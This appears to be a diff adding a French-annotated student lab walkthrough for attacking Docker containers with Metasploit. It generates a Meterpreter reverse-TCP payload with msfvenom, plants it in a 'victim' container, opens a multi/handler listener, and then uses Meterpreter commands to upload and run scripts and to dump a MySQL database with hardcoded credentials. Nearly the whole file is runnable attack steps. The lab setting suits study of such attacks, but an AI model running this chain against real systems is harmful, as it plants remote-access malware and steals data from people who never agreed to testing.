@@ -1,0 +1,121 @@
+sudo docker exec -it pentest_container bash
+
+apt update && apt upgrade -y
+
+apt install -y curl wget gnupg2 build-essential libreadline-dev zlib1g-dev libssl-dev libsqlite3-dev libpq-dev
+
+
+curl https://apt.metasploit.com/metasploit-framework.gpg.key | apt-key add -
+echo "deb http://apt.metasploit.com/ buster main" > /etc/apt/sources.list.d/metasploit-framework.list
+apt update
+apt install -y metasploit-framework
+
+
+msfconsole --version
+
+apt-get install net-tools
+
+//pour tester ping 
+apt-get install -y iputils-ping
+
+//attention à mettre l adresse de eth1 et non eth0
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ton_ip_ubuntu> LPORT=4444 -f elf -o rat_payload.elf
+
+
+ls //  rat_payload.exe
+
+
+
+
+//dans terminale de la machine on copie le fichier pour le coller à la victime
+
+sudo docker cp pentest_container:/rat_payload.elf Desktop/STI_4A/projet_platformes/v_quen/
+sudo docker cp Desktop/STI_4A/projet_platformes/v_quen/rat_payload.elf victim_container:/root/
+
+
+
+
+
+
+
+
+msfconsole
+
+use exploit/multi/handler
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+set LHOST <ton_ip_ubuntu>
+set LPORT 4444
+exploit
+
+
+
+
+
+Victime : 
+
+
+chmod +x /root/rat_payload.elf
+
+//pour povoir executer le binaire 
+apt install -y wine 
+
+
+
+
+
+
+
+
+//tester la connection avec la base de données 
+
+apt update && apt install mysql-client -y
+
+mysql -u fromage_user -p -h mysql_db -D fromage_db
+
+
+
+
+Attaques : 
+
+ls
+upload 
+... 
+
+execute -f /usr/bin/mysql -a "-u fromage_user -pfromage_password -h mysql_db -D fromage_db -e 'SHOW TABLES;'" -i
+
+
+execute -f /usr/bin/mysql -a "-u fromage_user -pfromage_password -h mysql_db -D fromage_db -e 'SELECT * FROM fromages;'" -i
+
+
+
+
+
+
+system mysql -u fromage_user -p fromage_password -h <IP_de_la_base_de_données> fromage_db
+//pour touver le ip on fait 
+sudo docker ps 
+sudo docker inspect <le_id>
+  
+
+
+sudo apt-get install nano
+
+nano script.sh 
+
+#!/bin/bash
+echo "je suis dedans"
+
+
+
+upload script.sh /root/script.sh
+upload script.sh /root/script.sh
+ls
+execute -f /bin/bash -a "/root/script.sh" -i
+
+
+
+
+
+
+
+
